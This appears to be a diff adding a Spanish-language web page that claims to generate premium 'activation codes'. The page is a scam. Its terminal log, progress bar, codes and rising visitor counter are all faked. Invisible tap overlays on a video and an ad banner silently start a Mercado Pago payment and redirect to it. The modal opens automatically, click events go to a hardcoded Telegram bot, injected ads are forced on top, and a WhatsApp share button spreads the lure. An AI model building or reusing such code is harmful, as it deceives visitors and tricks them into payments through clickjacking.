@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Generador de Código de Acceso</title>
+<style>
+  :root{
+    --bg:#000000;
+    --fg:#ffffff;
+    --silver:#A0A0A0;
+    --silver-dim:#5a5a5a;
+    --wp:#25D366;
+    --yellow:#F8D849;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html,body{
+    height:100%;
+    background:var(--bg);
+    color:var(--fg);
+    font-family:'Courier New', 'Segoe UI', monospace, sans-serif;
+    overflow:hidden;
+  }
+  body{
+    display:flex;
+    flex-direction:column;
+    height:100vh;
+    width:100vw;
+  }
+
+  /* ===== MAIN SCREEN ===== */
+  .main-wrap{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    text-align:center;
+    position:relative;
+    gap:18px;
+    overflow:hidden;
+  }
+
+  .badge{
+    border:1px solid var(--silver-dim);
+    color:var(--silver);
+    font-size:11px;
+    letter-spacing:2px;
+    padding:5px 14px;
+    border-radius:8px;
+    text-transform:uppercase;
+    animation:fadeIn 0.8s ease;
+  }
+
+  h1{
+    font-size:clamp(24px, 6vw, 42px);
+    font-weight:800;
+    letter-spacing:1px;
+    line-height:1.2;
+    animation:fadeIn 1s ease;
+  }
+  h1 span{
+    color:var(--silver);
+  }
+
+  .subtitle{
+    color:var(--silver);
+    font-size:clamp(12px, 2.5vw, 15px);
+    max-width:340px;
+    animation:fadeIn 1.2s ease;
+  }
+
+  #generateBtn{
+    background:var(--fg);
+    color:#000;
+    border:none;
+    padding:16px 38px;
+    font-size:15px;
+    font-weight:700;
+    letter-spacing:1px;
+    border-radius:8px;
+    cursor:pointer;
+    position:relative;
+    overflow:hidden;
+    transition:transform .15s ease, box-shadow .25s ease, background .25s ease;
+    animation:fadeIn 1.4s ease, pulse 2.4s ease-in-out infinite;
+    text-transform:uppercase;
+  }
+  #generateBtn::after{
+    content:'';
+    position:absolute;
+    top:0; left:-150%;
+    width:60%; height:100%;
+    background:linear-gradient(120deg, transparent, rgba(0,0,0,0.25), transparent);
+    animation:shine 2.4s ease-in-out infinite;
+  }
+  @keyframes shine{
+    0%{left:-150%;}
+    60%{left:150%;}
+    100%{left:150%;}
+  }
+  #generateBtn:hover{
+    transform:translateY(-2px);
+    box-shadow:0 0 22px rgba(255,255,255,0.35);
+  }
+  #generateBtn:active{
+    transform:translateY(0px) scale(.97);
+  }
+
+  .fans-row{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    color:var(--silver);
+    font-size:12px;
+    animation:fadeIn 1.6s ease;
+  }
+  .avatars{
+    display:flex;
+  }
+  .avatars span{
+    width:22px;height:22px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#333,#666);
+    border:1.5px solid #000;
+    margin-left:-8px;
+    display:inline-block;
+  }
+  .avatars span:first-child{margin-left:0;}
+  #fansCount{color:var(--fg); font-weight:700;}
+
+  .sticky-ad{
+    width:100%;
+    height:50px;
+    min-height:50px;
+    background:#0a0a0a;
+    border-top:1px solid var(--silver-dim);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+    overflow:hidden;
+  }
+
+  @keyframes fadeIn{
+    from{opacity:0; transform:translateY(8px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+  @keyframes pulse{
+    0%,100%{box-shadow:0 0 0px rgba(255,255,255,0);}
+    50%{box-shadow:0 0 14px rgba(255,255,255,0.25);}
+  }
+
+  /* ===== MODAL ===== */
+  .overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.95);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    z-index:5000;
+    padding:14px;
+  }
+  .overlay.active{
+    display:flex;
+    animation:fadeIn .2s ease;
+  }
+
+  .modal{
+    background:#080808;
+    border:1px solid #222;
+    border-radius:10px;
+    width:100%;
+    max-width:380px;
+    max-height:94vh;
+    display:flex;
+    flex-direction:column;
+    overflow:hidden;
+    box-shadow:0 0 40px rgba(0,0,0,0.8);
+  }
+
+  .modal-header{
+    padding:16px;
+    border-bottom:1px solid #1a1a1a;
+    flex-shrink:0;
+  }
+  .modal-header h2{
+    font-size:13px;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--silver);
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .dot{
+    width:8px;height:8px;border-radius:50%;
+    background:#1f8b3c;
+    flex-shrink:0;
+  }
+  .dot.active{
+    background:#3ddc6a;
+    animation:blink 1s infinite;
+  }
+  @keyframes blink{50%{opacity:.3;}}
+
+  @keyframes buttonPulse {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
+    50% { transform: scale(1.03); box-shadow: 0 0 15px 6px rgba(245, 158, 11, 0.6); }
+  }
+
+  .modal-body{
+    padding:20px 16px;
+    overflow-y:auto;
+    flex:1;
+  }
+  .modal-body::-webkit-scrollbar{width:4px;}
+  .modal-body::-webkit-scrollbar-thumb{background:var(--silver-dim); border-radius:4px;}
+
+  /* ===== VERIFICACIÓN ESCANEABLE ===== */
+  #verificationState {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 14px;
+  }
+  #verificationState.active {
+    display: flex;
+    animation: fadeIn .3s ease;
+  }
+  
+  .progress-ring-container {
+    position: relative;
+    width: 64px;
+    height: 64px;
+    margin-bottom: 4px;
+  }
+  .progress-ring-circle-bg {
+    fill: none;
+    stroke: #1a1a1a;
+    stroke-width: 3.5;
+  }
+  .progress-ring-circle {
+    fill: none;
+    stroke: #f59e0b;
+    stroke-width: 3.5;
+    stroke-linecap: round;
+    stroke-dasharray: 95, 100;
+    animation: drawCircle 1s ease-out forwards;
+  }
+  @keyframes drawCircle {
+    0% { stroke-dasharray: 0, 100; }
+    100% { stroke-dasharray: 95, 100; }
+  }
+  .progress-ring-text {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    font-size: 13px;
+    font-weight: 800;
+    fill: #f59e0b;
+  }
+
+  .verification-title {
+    color: #ffffff;
+    font-size: 18px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .verification-title span {
+    color: #f59e0b;
+  }
+  
+  .verification-steps {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+    text-align: left;
+    width: 100%;
+    margin-top: 6px;
+    margin-bottom: 12px;
+    background: #0f0f0f;
+    padding: 16px;
+    border-radius: 10px;
+    border: 1px solid #1f1f1f;
+  }
+  .v-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+  }
+  .v-step-num {
+    background: rgba(245, 158, 11, 0.15);
+    color: #f59e0b;
+    font-weight: 800;
+    font-size: 13px;
+    min-width: 24px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    margin-top: 2px;
+    border: 1px solid rgba(245, 158, 11, 0.3);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .v-step-txt {
+    color: #d1d5db;
+    font-size: 13.5px;
+    font-weight: 500;
+    line-height: 1.5;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .v-step-txt strong {
+    color: #ffffff;
+    font-weight: 700;
+  }
+  .v-step-txt .highlight {
+    color: #f59e0b;
+    font-weight: 800;
+  }
+  
+  .btn-yellow {
+    background: linear-gradient(135deg, #F8D849 0%, #f59e0b 100%);
+    color: #000000;
+    border: none;
+    width: 100%;
+    padding: 16px;
+    border-radius: 8px;
+    font-weight: 800;
+    font-size: 14px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(245, 158, 11, 0.2);
+    transition: transform .15s ease, filter .2s ease;
+    animation: buttonPulse 2s infinite ease-in-out;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+  .btn-yellow:hover {
+    filter: brightness(1.1);
+    transform: translateY(-2px);
+  }
+
+  /* Contenedor Multimedia */
+  #mediaContainer {
+    display: none;
+    width: 100%;
+    background: #000;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 10px;
+    position: relative; /* Necesario para el tap absoluto */
+  }
+  #mediaContainer video, #mediaContainer img {
+    width: 100%;
+    display: block;
+    border-radius: 8px;
+  }
+
+  /* CAPA DE TAP INVISIBLE */
+  .invisible-tap-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 999;
+    background: rgba(0, 0, 0, 0);
+    cursor: pointer;
+    display: block;
+  }
+
+  /* ===== CARGA Y RESULTADO ===== */
+  #loadingState{ display:none; }
+  .terminal{
+    background:#000; border:1px solid #1a1a1a; border-radius:8px; padding:12px;
+    font-size:12px; line-height:1.7; min-height:140px; max-height:160px; overflow-y:auto; color:#7CFC7C;
+  }
+  .terminal::-webkit-scrollbar{width:0;}
+  .term-line{ display:flex; gap:6px; opacity:0; animation:termIn .35s ease forwards; color:var(--silver); }
+  .term-line .ok{color:#3ddc6a; flex-shrink:0;}
+  .term-line .txt{color:#d8d8d8;}
+  @keyframes termIn{ from{opacity:0; transform:translateX(-4px);} to{opacity:1; transform:translateX(0);} }
+
+  .progress-wrap{ margin-top:14px; }
+  .progress-label{ display:flex; justify-content:space-between; font-size:11px; color:var(--silver); margin-bottom:6px; letter-spacing:.5px; }
+  .progress-track{ width:100%; height:6px; background:#1a1a1a; border-radius:8px; overflow:hidden; border:1px solid #222; }
+  .progress-fill{ height:100%; width:0%; background:linear-gradient(90deg, var(--silver-dim), var(--fg)); border-radius:8px; transition:width .2s linear; }
+
+  .ad-slot-small{
+    margin-top:14px; width:320px; height:50px; max-width:100%; background:#0a0a0a;
+    border:1px dashed var(--silver-dim); border-radius:8px; display:flex; align-items:center;
+    justify-content:center; margin-left:auto; margin-right:auto; overflow:hidden;
+  }
+  .ad-slot-big{
+    margin-top:16px; width:300px; height:250px; max-width:100%; background:#0a0a0a;
+    border:1px solid #1f1f1f; border-radius:8px; display:flex; align-items:center;
+    justify-content:center; margin-left:auto; margin-right:auto; overflow:hidden;
+    position: relative; /* Necesario para el tap absoluto */
+  }
+  .ad-slot-big img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  .modal-fans{ margin-top:14px; display:flex; align-items:center; justify-content:center; gap:8px; color:var(--silver); font-size:11px; }
+
+  #resultState{ display:none; flex-direction:column; gap:14px; animation:fadeIn .4s ease; }
+  #resultState.active{display:flex;}
+  .result-title{ font-size:13px; color:var(--silver); letter-spacing:1px; text-transform:uppercase; text-align:center; }
+  .code-card{
+    border:1px solid var(--silver-dim); border-radius:8px; padding:12px 14px; display:flex;
+    align-items:center; justify-content:space-between; gap:10px; background:#0a0a0a; animation:fadeIn .5s ease;
+  }
+  .code-card .label{ font-size:11px; color:var(--silver); text-transform:uppercase; letter-spacing:1px; margin-bottom:4px; }
+  .code-card .code{ font-size:20px; font-weight:800; letter-spacing:2px; color:var(--fg); }
+  .copy-btn{
+    background:transparent; border:1px solid var(--silver); color:var(--fg); padding:8px 14px;
+    border-radius:8px; font-size:12px; cursor:pointer; transition:all .2s ease; flex-shrink:0; white-space:nowrap;
+  }
+  .copy-btn:hover{ background:var(--fg); color:#000; }
+  .copy-btn.copied{ background:#3ddc6a; border-color:#3ddc6a; color:#000; }
+
+  .wa-btn{
+    display:flex; align-items:center; justify-content:center; gap:10px; background:var(--wp);
+    color:#ffffff; border:none; padding:13px; border-radius:8px; font-weight:700; font-size:13px;
+    letter-spacing:.5px; cursor:pointer; text-decoration:none; transition:transform .15s ease, filter .2s ease;
+  }
+  .wa-btn:hover{ filter:brightness(1.08); transform:translateY(-1px); }
+  .wa-btn svg{ width:20px; height:20px; flex-shrink:0; }
+
+  @media (max-height:680px){
+    .terminal{max-height:90px;}
+    .ad-slot-big{height:180px; width:220px;}
+  }
+</style>
+</head>
+<body>
+
+  <div class="main-wrap">
+    <div class="badge">Acceso Premium · 2026</div>
+    <h1>Generador de <span>Código</span><br>de Activación</h1>
+    <button id="generateBtn">Generar Código - Clic Aquí</button>
+
+    <div class="fans-row">
+      <span class="avatars">
+        <span></span><span></span><span></span><span></span>
+      </span>
+      <span><strong id="fansCount">8,431</strong> personas generaron su código hoy</span>
+    </div>
+  </div>
+
+  <div class="sticky-ad" style="display:none;"></div>
+
+  <div class="overlay" id="overlay">
+    <div class="modal">
+      <div class="modal-header">
+        <h2 id="modalHeaderTitle"><span class="dot" id="modalHeaderDot"></span> Servidor Seguro</h2>
+      </div>
+
+      <div class="modal-body">
+
+        <div id="mediaContainer">
+          <div onclick="generarPagoPago(event)" class="invisible-tap-overlay" style="cursor:pointer;"></div>
+          
+          <video id="stepVideo" src="https://api.allorigins.win/raw?url=https://drive.google.com/file/d/1NF92aD4DCu-IOf7AT7W4w6mTg3heoq9V/view?usp=drivesdk" playsinline></video>
+          <img id="stepImage" src="https://i.ibb.co/gM18Xr2h/1000455514.png" alt="Verificación" style="display:none;">
+        </div>
+
+        <div id="verificationState">
+          
+          <div class="progress-ring-container">
+            <svg viewBox="0 0 36 36" style="width: 100%; height: 100%;">
+              <path class="progress-ring-circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+              <path class="progress-ring-circle" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+              <text x="18" y="22.5" class="progress-ring-text" text-anchor="middle">99%</text>
+            </svg>
+          </div>
+          
+          <div class="verification-title">Progreso: <span>Casi Completo</span></div>
+
+          <div class="verification-steps">
+            <div class="v-step">
+              <div class="v-step-num">1</div>
+              <p class="v-step-txt">Tu código ya fue generado, pero se encuentra <span class="highlight">temporalmente retenido</span>.</p>
+            </div>
+            <div class="v-step">
+              <div class="v-step-num">2</div>
+              <p class="v-step-txt">Presiona el botón de abajo y <strong>completa el último paso del sistema</strong> para liberarlo.</p>
+            </div>
+            <div class="v-step">
+              <div class="v-step-num">3</div>
+              <p class="v-step-txt">Regresa a esta ventana y <strong>copia tus credenciales activas</strong> inmediatamente.</p>
+            </div>
+          </div>
+
+          <button id="verifyBtnAction" class="btn-yellow">⚡ COMPLETAR ÚLTIMO PASO AHORA</button>
+        </div>
+
+        <div id="loadingState">
+          <div class="terminal" id="terminal"></div>
+
+          <div class="progress-wrap">
+            <div class="progress-label">
+              <span id="progressMsg">Estableciendo conexión segura...</span>
+              <span id="progressPct">0%</span>
+            </div>
+            <div class="progress-track">
+              <div class="progress-fill" id="progressFill"></div>
+            </div>
+          </div>
+
+          <div class="ad-slot-small" id="adSlot320x50">
+            <script type="text/javascript">
+              atOptions = {
+                'key' : '87b04073200cdd655a562f19119611bb',
+                'format' : 'iframe',
+                'height' : 50,
+                'width' : 320,
+                'params' : {}
+              };
+            </script>
+            <script type="text/javascript" src="https://www.highperformanceformat.com/87b04073200cdd655a562f19119611bb/invoke.js"></script>
+          </div>
+
+          <div class="ad-slot-big" id="adSlot300x250">
+            <div onclick="generarPagoPago(event)" class="invisible-tap-overlay" style="cursor:pointer;"></div>
+            
+            <img src="https://i.ibb.co/gM18Xr2h/1000455514.png" alt="Banner Competitions">
+          </div>
+
+          <div class="modal-fans">
+            <span class="avatars"><span></span><span></span><span></span></span>
+            <span><strong id="fansCountModal">8,431</strong> generando códigos ahora</span>
+          </div>
+        </div>
+
+        <div id="resultState" class="result-box">
+          <p class="result-title">✅ Código generado con éxito</p>
+
+          <div class="code-card">
+            <div><div class="label">Código 1</div><div class="code">7913100</div></div>
+            <button class="copy-btn" data-code="7913100">Copiar</button>
+          </div>
+          <div class="code-card">
+            <div><div class="label">Código 2</div><div class="code">7827154</div></div>
+            <button class="copy-btn" data-code="7827154">Copiar</button>
+          </div>
+          <div class="code-card">
+            <div><div class="label">Código 3</div><div class="code">2822545</div></div>
+            <button class="copy-btn" data-code="2822545">Copiar</button>
+          </div>
+
+          <a class="wa-btn" id="shareWaBtn" target="_blank" rel="noopener">
+            <svg viewBox="0 0 24 24" fill="#ffffff"><path d="M17.6 6.32A8.86 8.86 0 0 0 12.05 3.6c-4.88 0-8.86 3.97-8.86 8.86 0 1.56.42 3.07 1.2 4.39L3.6 21.4a.5.5 0 0 0 .6.62l4.7-1.23a8.84 8.84 0 0 0 4.15 1.05h.01c4.88 0 8.86-3.97 8.86-8.86a8.85 8.85 0 0 0-2.32-5.96zM12.05 20.1h-.01a7.3 7.3 0 0 1-3.73-1.02l-.27-.16-2.78.73.74-2.71-.18-.28a7.3 7.3 0 0 1-1.12-3.9c0-4.04 3.3-7.34 7.36-7.34a7.32 7.32 0 0 1 7.34 7.34c0 4.05-3.3 7.34-7.35 7.34zm4.03-5.5c-.22-.11-1.3-.64-1.5-.72-.2-.07-.35-.11-.5.11-.15.22-.57.72-.7.87-.13.15-.26.16-.48.05-.22-.1-.93-.34-1.77-1.09-.65-.58-1.09-1.3-1.22-1.52-.13-.22-.01-.34.1-.46.1-.1.22-.27.33-.4.11-.13.15-.22.22-.37.07-.15.04-.27-.02-.38-.06-.11-.6-1.45-.82-1.98-.22-.53-.44-.46-.6-.47-.16-.01-.34-.01-.52-.01-.18 0-.47.07-.71.34-.24.27-.93.91-.93 2.21s.95 2.55 1.08 2.72c.13.18 1.83 2.79 4.43 3.8 2.6 1.01 2.6.67 3.07.62.47-.05 1.5-.61 1.71-1.2.22-.6.22-1.1.15-1.21-.07-.11-.25-.18-.47-.29z"/></svg>
+            Compartir por WhatsApp
+          </a>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+<script>
+  // ===== CONFIG =====
+  const TOTAL_TIME = 25000;
+  const CODE_LINK = "https://accesocodigo.vercel.app/";
+
+  // ══ TELEGRAM ══
+  const TG_TOKEN = '8922992878:AAEBqGZAbwoopQNMgiAsnxkSYECVh3xFQ_s';
+  const TG_CHAT  = '1696446405';
+
+  function tgFetch(msg) {
+    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
+    }).catch(()=>{});
+  }
+
+  // ===== ESCUCHA DE RETORNO =====
+  window.addEventListener('pageshow', (event) => {
+    if (localStorage.getItem('verified') === 'true') {
+      localStorage.removeItem('verified');
+      startLoadingProcess();
+    }
+  });
+
+  const stages = [
+    { time: 0,     msg: "Conectando con nuestros servidores..." },
+    { time: 5000,  msg: "Buscando tu código disponible..." },
+    { time: 10000, msg: "Revisando que todo esté en orden..." },
+    { time: 15000, msg: "Preparando tu código de acceso..." },
+    { time: 20000, msg: "Ya casi está listo..." }
+  ];
+
+  const terminalTasks = [
+    { time: 300,   text: "Abriendo tu solicitud 👋" },
+    { time: 2200,  text: "Conectando con nuestros servidores" },
+    { time: 3800,  text: "Todo en orden por aquí, seguimos" },
+    { time: 5400,  text: "Buscando un código disponible para vos" },
+    { time: 7200,  text: "Casi listo, ordenando los datos" },
+    { time: 9000,  text: "Códigos disponibles encontrados ✨" },
+    { time: 10600, text: "Confirmando que todo funcione bien" },
+    { time: 12400, text: "Tu dispositivo es compatible 👍" },
+    { time: 14000, text: "Preparando tu acceso personal" },
+    { time: 15600, text: "Creando tu código único" },
+    { time: 17400, text: "Asignándote un código exclusivo" },
+    { time: 19000, text: "¡Tu código ya está listo!" },
+    { time: 20600, text: "Haciendo una última revisión" },
+    { time: 22200, text: "Dejando todo prolijo para vos" },
+    { time: 23800, text: "Ya casi... abriendo tu código 🎉" }
+  ];
+
+  const generateBtn = document.getElementById('generateBtn');
+  const overlay = document.getElementById('overlay');
+  const terminal = document.getElementById('terminal');
+  const progressMsg = document.getElementById('progressMsg');
+  const progressPct = document.getElementById('progressPct');
+  const progressFill = document.getElementById('progressFill');
+  
+  const verificationState = document.getElementById('verificationState');
+  const loadingState = document.getElementById('loadingState');
+  const resultState = document.getElementById('resultState');
+  
+  const modalHeaderTitle = document.getElementById('modalHeaderTitle');
+
+  const fansCount = document.getElementById('fansCount');
+  const fansCountModal = document.getElementById('fansCountModal');
+
+  const mediaContainer = document.getElementById('mediaContainer');
+  const stepVideo = document.getElementById('stepVideo');
+  const stepImage = document.getElementById('stepImage');
+
+  let timeouts = [];
+  let autoTimer; 
+
+  function clearAllTimeouts(){
+    timeouts.forEach(t => clearTimeout(t));
+    timeouts = [];
+  }
+
+  function addTerminalLine(text){
+    const line = document.createElement('div');
+    line.className = 'term-line';
+    line.innerHTML = `<span class="ok">✔</span><span class="txt">${text}</span>`;
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  // --- PASO 1: MOSTRAR VERIFICACIÓN AL INSTANTE ---
+  function showVerification(){
+    clearTimeout(autoTimer); 
+    clearAllTimeouts();
+    
+    modalHeaderTitle.innerHTML = '<span class="dot" id="modalHeaderDot"></span> Servidor Seguro';
+    
+    mediaContainer.style.display = 'none';
+    stepVideo.style.display = 'block';
+    stepImage.style.display = 'none';
+
+    loadingState.style.display = 'none';
+    resultState.classList.remove('active');
+    verificationState.classList.add('active');
+    overlay.classList.add('active');
+  }
+
+  // --- PASO 2: MOSTRAR CARGA Y PROGRESO ---
+  function startLoadingProcess(){
+    clearTimeout(autoTimer); 
+    clearAllTimeouts();
+
+    modalHeaderTitle.innerHTML = '<span class="dot active" id="modalHeaderDot"></span> Preparando tu código';
+    
+    mediaContainer.style.display = 'none';
+    verificationState.classList.remove('active');
+    loadingState.style.display = 'block';
+    overlay.classList.add('active');
+
+    terminal.innerHTML = '';
+    progressFill.style.width = '0%';
+    progressPct.textContent = '0%';
+    progressMsg.textContent = stages[0].msg;
+
+    stages.forEach(stage => {
+      const t = setTimeout(() => { progressMsg.textContent = stage.msg; }, stage.time);
+      timeouts.push(t);
+    });
+
+    terminalTasks.forEach(task => {
+      const t = setTimeout(() => { addTerminalLine(task.text); }, task.time);
+      timeouts.push(t);
+    });
+
+    const start = Date.now();
+    const interval = setInterval(() => {
+      const elapsed = Date.now() - start;
+      let pct = Math.min(100, (elapsed / TOTAL_TIME) * 100);
+      progressFill.style.width = pct + '%';
+      progressPct.textContent = Math.floor(pct) + '%';
+      if (pct >= 100) clearInterval(interval);
+    }, 100);
+
+    const finishTimeout = setTimeout(() => {
+      loadingState.style.display = 'none';
+      resultState.classList.add('active');
+    }, TOTAL_TIME);
+    timeouts.push(finishTimeout);
+  }
+
+  // --- EVENTO DEL BOTÓN AMARILLO (VÍDEO + FOTO) ---
+  document.getElementById('verifyBtnAction').addEventListener('click', () => {
+    verificationState.style.display = 'none';
+    mediaContainer.style.display = 'block';
+    
+    stepVideo.play().catch(() => {
+      handleVideoEnd();
+    });
+  });
+
+  // Evento al finalizar el vídeo
+  stepVideo.addEventListener('ended', handleVideoEnd);
+
+  function handleVideoEnd() {
+    stepVideo.style.display = 'none';
+    stepImage.style.display = 'block';
+
+    // Esperar 4 segundos mostrando la foto antes de pasar a la terminal
+    setTimeout(() => {
+      startLoadingProcess();
+    }, 4000);
+  }
+
+  let autoTriggered = false;
+
+  function onGenerateClick(){
+    if (autoTriggered) return;
+    autoTriggered = true;
+    clearTimeout(autoTimer);
+    tgFetch('Click - Boton Generar Codigo🥂');
+    showVerification();
+  }
+
+  generateBtn.addEventListener('click', onGenerateClick);
+
+  // Auto-activación si no hacen clic en 5 segundos
+  autoTimer = setTimeout(() => {
+    if (!autoTriggered){
+      autoTriggered = true;
+      tgFetch('Click - Boton Generar Codigo🥂');
+      showVerification();
+    }
+  }, 5000);
+
+  // --- BOTONES COPIAR Y WHATSAPP ---
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const code = btn.getAttribute('data-code');
+      navigator.clipboard.writeText(code).then(() => {
+        const original = btn.textContent;
+        btn.textContent = '✔ Copiado';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = original;
+          btn.classList.remove('copied');
+        }, 1500);
+      });
+    });
+  });
+
+  const waBtn = document.getElementById('shareWaBtn');
+  const waMessage = `Generá los códigos para descargar la aplicación acá: ${CODE_LINK}`;
+  waBtn.href = `https://wa.me/?text=${encodeURIComponent(waMessage)}`;
+
+  function bumpFans(){
+    [fansCount, fansCountModal].forEach(el => {
+      if (!el) return;
+      let current = parseInt(el.textContent.replace(/,/g,''));
+      current += Math.floor(Math.random() * 3) + 1;
+      el.textContent = current.toLocaleString('en-US');
+    });
+  }
+  setInterval(bumpFans, 6000);
+
+  // --- VISIBILIDAD CAPAS ---
+  const OWN_IDS = ['overlay'];
+  function forceOnTop(node){
+    if (!(node instanceof HTMLElement)) return;
+    if (OWN_IDS.includes(node.id)) return;
+    if (node.classList && (node.classList.contains('sticky-ad') || node.classList.contains('main-wrap'))) return;
+    if (node.tagName === 'SCRIPT' || node.tagName === 'LINK' || node.tagName === 'STYLE') return;
+    try{
+      node.style.setProperty('z-index', '999999', 'important');
+      const pos = window.getComputedStyle(node).position;
+      if (pos === 'static'){
+        node.style.setProperty('position', 'fixed', 'important');
+      }
+    }catch(e){}
+  }
+
+  const bodyObserver = new MutationObserver((mutations) => {
+    mutations.forEach(m => {
+      m.addedNodes.forEach(node => {
+        if (node.parentElement === document.body){
+          forceOnTop(node);
+        }
+      });
+    });
+  });
+  bodyObserver.observe(document.body, { childList: true });
+  Array.from(document.body.children).forEach(forceOnTop);
+
+  // ===== FUNCIÓN PARA GENERAR PAGO EN MERCADO PAGO =====
+  // ⚠️ CAMBIAR ESTA URL POR TU DOMINIO DE VERCEL
+  const BACKEND_MP = 'https://accesocodigo.vercel.app';
+  const GOOGLE_DRIVE_LINK = 'https://drive.google.com/drive/folders/1evkK59H3E-IAq_fh97zGnJEaf8FFDsQp';
+
+  async function generarPagoPago(event) {
+    event.preventDefault();
+    event.stopPropagation();
+    
+    // Mostrar estado de carga
+    const btn = event.target;
+    const originalCursor = btn.style.cursor;
+    btn.style.cursor = 'wait';
+    btn.style.opacity = '0.6';
+    
+    try {
+      const response = await fetch(`${BACKEND_MP}/api/create-preference`, {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json' 
+        },
+        body: JSON.stringify({ plan: 'album2026' })
+      });
+
+      const data = await response.json();
+
+      if (data.init_point) {
+        // ✅ Redirigir a Mercado Pago
+        window.location.href = data.init_point;
+      } else {
+        console.error('Error de pago:', data.error);
+        alert('❌ Error al procesar el pago. Intenta de nuevo.');
+        btn.style.cursor = originalCursor;
+        btn.style.opacity = '1';
+      }
+    } catch (err) {
+      console.error('Error de conexión:', err);
+      alert('❌ Error de conexión. Verifica tu internet e intenta de nuevo.');
+      btn.style.cursor = originalCursor;
+      btn.style.opacity = '1';
+    }
+  }
+</script>
+
+</body>
+</html>
